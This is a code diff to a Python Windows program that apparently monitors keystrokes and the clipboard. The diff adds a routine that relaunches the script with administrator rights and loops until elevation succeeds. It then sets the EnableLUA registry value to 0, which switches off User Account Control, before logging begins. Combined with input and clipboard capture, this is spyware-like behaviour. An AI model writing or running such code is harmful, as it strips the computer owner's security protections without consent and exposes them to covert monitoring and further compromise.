@@ -1,6 +1,7 @@
 import io
 import os
 import sys
+import winreg
 import ctypes
 import datetime
 import keyboard
@@ -9,7 +10,9 @@ import threading
 import time
 import signal
 import atexit
+import win32con
 import pyperclip
+import win32security
 import psutil
 import subprocess
 import requests
@@ -315,47 +318,27 @@ def monitor_processes():
             log_message(f"Error in monitor_processes: {e}", 'error')
         time.sleep(0.1)
 
-def read_registry_value(reg_path, value_name):
+def run_as_admin():
     try:
-        query_command = f'reg query "{reg_path}" /v "{value_name}"'
-        result = subprocess.run(query_command, shell=True, capture_output=True, text=True, check=True)
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
 
-        for line in result.stdout.splitlines():
-            if value_name in line:
-                return int(line.split()[-1], 16)
-
-    except subprocess.CalledProcessError:
-        return None
-
-    return None
-
-def update_lua():
-    reg_path = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
-    value_name = "EnableLUA"
-    desired_value = 0
-
-    current_value = read_registry_value(reg_path, value_name)
-
-    if current_value is None:
-        print("Failed to read the registry value.")
-        return
-
-    if current_value == desired_value:
-        print("Registry already set to desired value.")
-        return
-
-    reg_command = (
-        f'reg add "{reg_path}" /v "{value_name}" /t REG_DWORD /d {desired_value} /f'
-    )
+def disable_uac():
+    reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
 
     try:
-        subprocess.run(reg_command, shell=True, check=True)
-        print("Registry updated successfully.")
-    except subprocess.CalledProcessError as e:
-        print(f"Failed to update registry: {e}")
+        value, _ = winreg.QueryValueEx(reg_key, "EnableLUA")
+        if value > 0:
+            command = r"reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+            shell32 = ctypes.WinDLL('shell32', use_last_error=True)
+            ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
+            if ret < 32:
+                raise ctypes.WinError(ctypes.get_last_error())
+    except FileNotFoundError:
+        pass
 
-def run_compiled_functions():
-    update_lua()
+    winreg.CloseKey(reg_key)
 
 # ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
 #                                        [GUI Layout Functions]                                           #
@@ -431,8 +414,13 @@ if __name__ == '__main__':
         window.show()
         sys.exit(app.exec())
     else:
-        run_compiled_functions()
-        
+        if not run_as_admin():
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+            while not run_as_admin():
+                time.sleep(0.1)
+        time.sleep(2)
+        disable_uac()
+
         session_files = create_session_files()
         sentence = ''
         previous_clipboard_content = ''
